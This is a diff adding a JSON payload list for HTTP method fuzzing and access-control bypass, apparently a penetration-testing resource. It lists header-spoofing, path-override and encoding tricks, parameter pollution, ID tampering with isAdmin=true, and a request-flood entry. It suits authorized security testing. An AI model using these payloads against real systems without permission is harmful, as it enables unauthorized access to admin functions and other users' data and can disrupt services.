@@ -1,0 +1,231 @@
+{
+    "category": "HTTP Verbs/Methods Fuzzing",
+    "keyword": "http-verbs",
+    "payloads": [
+      {
+        "type": "Standard Methods",
+        "tech": "http",
+        "payload": "GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH"
+      },
+      {
+        "type": "Invented Methods",
+        "tech": "http",
+        "payload": "INVENTED, HACK"
+      },
+      {
+        "type": "HEAD Method Analysis",
+        "tech": "http",
+        "payload": "Check Content-Length in HEAD response for info leakage"
+      },
+      {
+        "type": "Method Override",
+        "tech": "http",
+        "payload": "X-HTTP-Method-Override: PUT"
+      },
+      {
+        "type": "TRACE Method Exploit",
+        "tech": "http",
+        "payload": "TRACE to reveal proxy-added headers"
+      },
+
+      {
+        "type": "Host Header",
+        "tech": "http",
+        "payload": "Host: arbitrary-value"
+      },
+      {
+        "type": "User-Agent Rotation",
+        "tech": "http",
+        "payload": "Rotate User-Agent values"
+      },
+      {
+        "type": "IP Spoofing Headers",
+        "tech": "http",
+        "payload": "X-Forwarded-For: 127.0.0.1"
+      },
+      {
+        "type": "IP Spoofing Headers",
+        "tech": "http",
+        "payload": "X-Originating-IP: 127.0.0.1"
+      },
+      {
+        "type": "IP Spoofing Headers",
+        "tech": "http",
+        "payload": "Client-IP: 127.0.0.1"
+      },
+      {
+        "type": "Path Override Headers",
+        "tech": "http",
+        "payload": "X-Original-URL: /admin/console"
+      },
+      {
+        "type": "Path Override Headers",
+        "tech": "http",
+        "payload": "X-Rewrite-URL: /admin/console"
+      },
+      {
+        "type": "Host Header Spoof",
+        "tech": "http",
+        "payload": "Host: localhost"
+      },
+      {
+        "type": "Header Removal",
+        "tech": "http",
+        "payload": "Remove Host header completely"
+      },
+      {
+        "type": "Hop-by-hop Headers",
+        "tech": "http",
+        "payload": "Abuse hop-by-hop headers for proxy bypass"
+      },
+
+      {
+        "type": "Dot Encoding",
+        "tech": "http",
+        "payload": "/%2e/path"
+      },
+      {
+        "type": "Double Encoding",
+        "tech": "http",
+        "payload": "/%252epath"
+      },
+      {
+        "type": "Unicode Bypass",
+        "tech": "http",
+        "payload": "/%ef%bc%8fpath"
+      },
+      {
+        "type": "Case Variation",
+        "tech": "http",
+        "payload": "/SECRET"
+      },
+      {
+        "type": "Trailing Slash",
+        "tech": "http",
+        "payload": "/secret/"
+      },
+      {
+        "type": "Dot Suffix",
+        "tech": "http",
+        "payload": "/secret/."
+      },
+      {
+        "type": "Double Slash",
+        "tech": "http",
+        "payload": "//secret//"
+      },
+      {
+        "type": "Path Traversal",
+        "tech": "http",
+        "payload": "/./secret/.."
+      },
+      {
+        "type": "Semicolon Injection",
+        "tech": "http",
+        "payload": "/;/secret"
+      },
+      {
+        "type": "Semicolon Variant",
+        "tech": "http",
+        "payload": "/.;/secret"
+      },
+      {
+        "type": "Mixed Symbols",
+        "tech": "http",
+        "payload": "//;//secret"
+      },
+      {
+        "type": "File Extension",
+        "tech": "http",
+        "payload": "/secret.json"
+      },
+      {
+        "type": "API Version",
+        "tech": "http",
+        "payload": "/v1/users_data/1234"
+      },
+      {
+        "type": "Array Wrapping",
+        "tech": "http",
+        "payload": "{\"id\":[111]}"
+      },
+      {
+        "type": "Object Wrapping",
+        "tech": "http",
+        "payload": "{\"id\":{\"id\":111}}"
+      },
+      {
+        "type": "JSON Parameter Pollution",
+        "tech": "http",
+        "payload": "{\"user_id\":\"<legit_id>\",\"user_id\":\"<victims_id>\"}"
+      },
+      {
+        "type": "Parameter Pollution",
+        "tech": "http",
+        "payload": "user_id=ATTACKER_ID&user_id=VICTIM_ID"
+      },
+
+      {
+        "type": "Value Increment",
+        "tech": "http",
+        "payload": "id=123 → id=124"
+      },
+      {
+        "type": "Add Parameters",
+        "tech": "http",
+        "payload": "id=124 → id=124&isAdmin=true"
+      },
+      {
+        "type": "Parameter Removal",
+        "tech": "http",
+        "payload": "Remove all parameters"
+      },
+      {
+        "type": "Parameter Reordering",
+        "tech": "http",
+        "payload": "Change parameter sequence"
+      },
+      {
+        "type": "Boundary Testing",
+        "tech": "http",
+        "payload": "id=-234, id=0, id=99999999"
+      },
+      {
+        "type": "Special Characters",
+        "tech": "http",
+        "payload": "id=null, id=true, id=*"
+      },
+
+      {
+        "type": "HTTP Downgrade",
+        "tech": "http",
+        "payload": "Try HTTP/1.0 instead of HTTP/1.1"
+      },
+      {
+        "type": "HTTP/2 Test",
+        "tech": "http",
+        "payload": "Test if HTTP/2 is supported"
+      },
+
+      {
+        "type": "Direct IP Access",
+        "tech": "dns",
+        "payload": "Connect via IP/CNAME instead of domain"
+      },
+      {
+        "type": "Server Stress",
+        "tech": "http",
+        "payload": "Flood with common GET requests"
+      },
+      {
+        "type": "Protocol Switch",
+        "tech": "http",
+        "payload": "http→https or https→http"
+      },
+      {
+        "type": "Archive Research",
+        "tech": "web-archive",
+        "payload": "Check https://archive.org/web/ for historical access"
+      }
+    ]
+}
